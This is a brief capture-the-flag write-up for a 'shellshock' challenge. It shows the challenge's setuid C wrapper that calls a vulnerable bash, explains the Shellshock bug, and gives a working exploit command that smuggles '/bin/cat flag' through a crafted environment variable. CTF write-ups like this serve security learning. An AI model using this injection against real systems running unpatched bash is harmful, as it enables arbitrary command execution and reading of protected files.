Prompt: Mommy, there was shocking news about bash. 
I bet you already know, but let's just make sure :)

shellshock.c:
#include <stdio.h>
int main(){
        setresuid(getegid(), getegid(), getegid());
        setresgid(getegid(), getegid(), getegid());
        system("/home/shellshock/bash -c 'echo shock_me'");
        return 0;
}

Shellshock is a well known bug that allows for arbitrary command
execution in an unpatched bash. The technique is to define a 
specially crafted environment variable that is executed like a 
function.

env VAR='() { :;}; /bin/cat flag' ./shellshock
